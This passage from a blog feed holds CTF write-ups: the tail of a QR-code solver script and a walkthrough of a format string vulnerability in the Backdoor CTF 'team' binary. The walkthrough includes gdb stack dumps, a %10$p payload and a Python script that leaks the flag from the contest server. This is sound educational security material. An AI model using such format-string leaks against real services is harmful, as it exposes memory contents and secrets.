-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-</span><span class='line'><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
-</span><span class='line'><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">popen</span>
-</span><span class='line'><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">telnetlib</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
-</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
-</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">getQR</span><span class="p">(</span><span class="n">qr</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;RGB&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mi">94</span><span class="p">,</span> <span class="mi">94</span><span class="p">),</span> <span class="s">&#39;white&#39;</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">pixels</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
-</span><span class='line'>  <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">qr</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span>
-</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
-</span><span class='line'>  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
-</span><span class='line'>  <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">qr</span><span class="p">):</span>
-</span><span class='line'>      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0xe2</span><span class="p">:</span>
-</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-</span><span class='line'>          <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
-</span><span class='line'>      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0x20</span><span class="p">:</span>
-</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">)</span>
-</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">)</span>
-</span><span class='line'>          <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
-</span><span class='line'>      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0xa</span><span class="p">:</span>
-</span><span class='line'>          <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
-</span><span class='line'>          <span class="n">y</span> <span class="o">+=</span> <span class="mi">2</span>
-</span><span class='line'>      <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="c"># write out QR to disk  </span>
-</span><span class='line'>  <span class="n">im</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">&#39;qr.png&#39;</span><span class="p">)</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="c"># ugly hack because ctf</span>
-</span><span class='line'>  <span class="n">popen</span><span class="p">(</span><span class="s">&#39;zbarimg ./qr.png &gt; qr.out&#39;</span><span class="p">)</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;qr.out&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span><span class='line'>      <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
-</span><span class='line'>      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;Code:([0-9a-f]*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-</span><span class='line'>  
-</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
-</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
-</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;hack.bckdr.in&quot;</span><span class="p">,</span> <span class="mi">8010</span><span class="p">))</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;can&#39;</span><span class="p">)</span> <span class="c"># banner</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
-</span><span class='line'>      <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-</span><span class='line'>          <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
-</span><span class='line'>          <span class="n">qr</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\x0a</span><span class="s">                                          &#39;</span><span class="p">)</span>
-</span><span class='line'>          <span class="c">#print qr</span>
-</span><span class='line'>          <span class="n">sendln</span><span class="p">(</span><span class="n">getQR</span><span class="p">(</span><span class="n">qr</span><span class="p">))</span>
-</span><span class='line'>          <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
-</span><span class='line'>          <span class="k">print</span> <span class="n">response</span>
-</span><span class='line'>  <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
-</span><span class='line'>      <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
-</span><span class='line'>      <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
-</span><span class='line'>      <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
-</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class='line'>  
-</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The script was receiving and decoding QR codes quite rapidly, but I didn&rsquo;t receive any flags. I finally just fired up <code>wireshark</code> to grab the flag from the TCP stream:</p>
-
-<p><img src="http://barrebas.github.io/assets/bckdr/qr-01.png" alt="" /></p>
-
-<p>Not the most elegant way to grab the flag, but hey, it worked.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
-    <updated>2015-04-02T19:23:27+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
-    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>
-
-<!-- more -->
-
-
-<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>
-
-<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>
-
-<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>bas@tritonal:~/tmp/bckdr/team-600$ ./team
-</span><span class='line'>Enter teamname: TEAM%llp
-</span><span class='line'>Enter flag: FLAG%llp
-</span><span class='line'>TEAM0x64 : incorrect flag. Try again.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048711 in ?? ()
-</span><span class='line'>gdb-peda$ x/40wx $esp
-</span><span class='line'>0xffffd510:   0x0804b008  0x00000064  0x0804b140  0x00000000
-</span><span class='line'>0xffffd520:   0x00000000  0x00000000  0x0804b0d8  0x0804b008
-</span><span class='line'>0xffffd530:   0x00000000  0x0804b140  0x67616c66  0x00000031
-</span><span class='line'>0xffffd540:   0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0xffffd550:   0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0xffffd560:   0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0xffffd570:   0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0xffffd580:   0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0xffffd590:   0x00000000  0x00000002  0x00000000  0x856b7a00
-</span><span class='line'>0xffffd5a0:   0x00000000  0x00000000  0xffffd5d8  0x0804880c</span></code></pre></td></tr></table></div></figure>
-
-
-<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0xffffd530:  0x00000000  0x0804b140  0x67616c66  0x00000031
-</span><span class='line'>                          flag1 &gt;&gt;&gt;   g a l f           1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/bckdr/team-600<span class="nv">$ </span>./team
-</span><span class='line'>Enter teamname: %10<span class="nv">$p</span>
-</span><span class='line'>Enter flag: bleh
-</span><span class='line'>0x67616c66 : incorrect flag. Try again.
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It worked remotely with this script:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
-</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
-</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
-</span><span class='line'>  
-</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
-</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
-</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;hack.bckdr.in&#39;</span><span class="p">,</span> <span class="mi">8004</span><span class="p">))</span>
-</span><span class='line'>  
-</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;teamname: &#39;</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;AAAA%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;$p&quot;</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;flag: &#39;</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;CTF_TEAM_VULNHUB&quot;</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;again.&#39;</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;0x([0-9a-f]*) :&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-</span><span class='line'>  
-</span><span class='line'><span class="n">full</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
-</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
-</span><span class='line'>  <span class="n">full</span> <span class="o">+=</span> <span class="n">pwn</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-</span><span class='line'>  <span class="k">print</span> <span class="n">full</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>
-
-<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
 ]]></content>
   </entry>
   
